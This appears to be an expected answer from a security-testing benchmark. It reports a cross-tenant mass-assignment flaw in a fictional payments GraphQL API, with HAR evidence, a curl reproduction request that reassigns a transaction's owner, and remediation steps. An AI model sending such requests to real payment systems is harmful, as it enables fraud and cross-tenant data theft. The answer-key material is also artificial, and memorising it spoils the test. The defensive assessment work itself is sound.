# Expected Response

## System
- Domain: FinTech / Payments
- System: PayBridge Transaction API
- Example ID: GQL-0120

## Priority Findings

### Finding 1: Payment Transaction Mass Assignment — Cross-Tenant Financial Record Ownership Takeover (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA / Mass Assignment

**Summary:**
Per §5.0 (Pattern 1.12 — mass assignment via object fields): The `updateResource` mutation accepts client-supplied `ownerId` and potentially `tenantId` fields, enabling mass assignment. An attacker from `tenant-47df` submitted `updateResource(id: "R-2120", input: {status: "approved", ownerId: "attacker-47dfd116"})` against payment transaction `R-2120` belonging to `tenant-d116`. In a payments platform, mass assignment of transaction ownership can redirect payment settlement, manipulate refund records, or bypass fraud controls.

**Evidence from HAR:**
- Request: `POST https://api.paybridge-transact.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-47df`
- Mutation: `updateResource(id: "R-2120", input: {status: "approved", ownerId: "attacker-47dfd116"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-d116"`, `sensitiveField: "CONFIDENTIAL-47dfd116"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-47dfd116`

## Steps to Reproduce

### Step 1 — Mass assignment on payment transaction (HAR)
```bash
curl -s -X POST https://api.paybridge-transact.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-47df" \
  -d '{"query": "mutation { updateResource(id: \"R-2120\", input: {status: \"approved\", ownerId: \"attacker-47dfd116\"}) { resourceId status } }"}'
```
**Vulnerable:** Payment transaction ownership poisoned. **Secure:** FORBIDDEN.

## Remediation
1. Strip `ownerId`, `tenantId` from `ResourceInput` — never client-writable.
2. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
